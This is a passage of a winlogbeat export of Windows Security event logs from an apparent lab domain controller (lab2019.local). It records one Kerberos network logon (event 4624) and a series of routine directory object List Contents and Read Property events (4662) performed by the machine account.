	Source Network Address:	192.168.1.251
	Source Port:		50464

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50464	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63d870	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109766	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:58:12.110"	"5RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:13.756"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109759	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.066"	"5BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4229c897-c211-437c-a5ae-dbf705b696e5}
	Object Name:		%{b0e68889-1cac-4c45-a037-32d97de9583c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{4229c897-c211-437c-a5ae-dbf705b696e5}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{048b4692-6227-4b67-a074-c4437083e14b}
			{6c7b5785-3d21-41bf-8a8a-627941544d5a}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b0e68889-1cac-4c45-a037-32d97de9583c}"	DS	"%{4229c897-c211-437c-a5ae-dbf705b696e5}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{4229c897-c211-437c-a5ae-dbf705b696e5}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{048b4692-6227-4b67-a074-c4437083e14b}
			{6c7b5785-3d21-41bf-8a8a-627941544d5a}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109741	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.066"	"4xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{04828aa9-6e42-4e80-b962-e2fe00754d17}
	Object Name:		%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{04828aa9-6e42-4e80-b962-e2fe00754d17}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}"	DS	"%{04828aa9-6e42-4e80-b962-e2fe00754d17}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{04828aa9-6e42-4e80-b962-e2fe00754d17}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109740	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.066"	"4hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4229c897-c211-437c-a5ae-dbf705b696e5}
	Object Name:		%{b0e68889-1cac-4c45-a037-32d97de9583c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4229c897-c211-437c-a5ae-dbf705b696e5}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b0e68889-1cac-4c45-a037-32d97de9583c}"	DS	"%{4229c897-c211-437c-a5ae-dbf705b696e5}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4229c897-c211-437c-a5ae-dbf705b696e5}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109739	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.066"	"4RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{04828aa9-6e42-4e80-b962-e2fe00754d17}
	Object Name:		%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}"	DS	"%{04828aa9-6e42-4e80-b962-e2fe00754d17}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109734	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.066"	"4BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109733	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.066"	"3xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{04828aa9-6e42-4e80-b962-e2fe00754d17}
	Object Name:		%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}"	DS	"%{04828aa9-6e42-4e80-b962-e2fe00754d17}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109732	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"3hC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
	Object Name:		%{d8aa644a-9df7-4ef3-92f3-141c7adea326}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{d68270ac-a5dc-4841-a6ac-cd68be38c181}
			{93c7b477-1f2e-4b40-b7bf-007e8d038ccf}
			{87811bd5-cd8b-45cb-9f5d-980f3a9e0c97}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{d8aa644a-9df7-4ef3-92f3-141c7adea326}"	DS	"%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{d68270ac-a5dc-4841-a6ac-cd68be38c181}
			{93c7b477-1f2e-4b40-b7bf-007e8d038ccf}
			{87811bd5-cd8b-45cb-9f5d-980f3a9e0c97}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109727	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"3RC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{64759b35-d3a1-42e4-b5f1-a3de162109b3}
	Object Name:		%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}"	DS	"%{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109726	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"3BC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
	Object Name:		%{d8aa644a-9df7-4ef3-92f3-141c7adea326}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{d8aa644a-9df7-4ef3-92f3-141c7adea326}"	DS	"%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109725	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:11.065"	"2xC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.747"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{64759b35-d3a1-42e4-b5f1-a3de162109b3}
	Object Name:		%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}"	DS	"%{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109722	"Directory Service Access"	" - "	" - "	" - "	" - "	-
